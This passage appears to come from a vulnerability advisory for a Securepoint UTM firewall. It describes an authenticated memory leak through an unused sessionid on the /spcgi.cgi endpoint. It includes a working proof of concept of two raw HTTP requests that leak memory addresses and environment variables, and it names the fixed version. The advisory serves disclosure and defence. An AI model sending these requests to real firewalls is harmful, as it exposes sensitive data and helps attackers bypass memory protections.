4. INTRODUCTION
===============
With secure networks, home office, site connectivity and the protection of your
data are easy to implement. UTM firewalls and VPN gateways from Securepoint secure
your networks - with suitable IT security solutions for small and medium-sized
businesses for rent, purchase or as a complete service.

(from the vendor's homepage)

5. VULNERABILITY DETAILS
========================
The firewall offers an administrative web panel on port 11115 and a user login
panel on port 443. Both use the endpoint at "/spcgi.cgi" to perform authentication
checks via the "login" command. Once authentication is successful (a low-privileged
user account is sufficient), and the returned "sessionid" has never been used in
any subsequent request, then the application will return remote memory contents
within the sessionid JSON attribute on all subsequent requests (that don't contain
the sessionId, hence referring to as "unused"). The leaked memory contents include
memory addresses as well as environment variables.

This happens because the application doesn't correctly initialize a variable later
used in the JSON output referencing the sessionid.

Successful exploits can allow an authenticated attacker to leak memory contents,
which might contain sensitive information, and help defeat memory protections such
as ASLR.

6. PROOF OF CONCEPT
===================
First, authenticate using any legitimate user against either the admin panel on port
11115 or the user panel on port 443 by using a single HTTP POST request like the
following:

POST /spcgi.cgi HTTP/1.1
Host: 192.168.175.1
Content-Length: 100
Accept: */*
Content-Type: application/json; charset=UTF-8
User-Agent: Mozilla/5.0
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{"module":"auth","command":["login"],"sessionid":"","arguments":{"user":"user","pass":"Password"}}

This returns a sessionid, which you must not use in subsequent requests. This is
important because the exploit won't work if you authenticate using the web interface
because the sessionid is immediately "used" in further requests being issued by the
application.

Then submit any JSON request without a sessionid against the same endpoint, such as:

POST /spcgi.cgi HTTP/1.1
Host: 192.168.175.1
Content-Length: 2
Accept: */*
Content-Type: application/json; charset=UTF-8
User-Agent: test
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{}

The remote memory contents are afterward leaked in response to that request within
the sessionid JSON attribute.

Upgrade to version 12.2.5.1 or newer
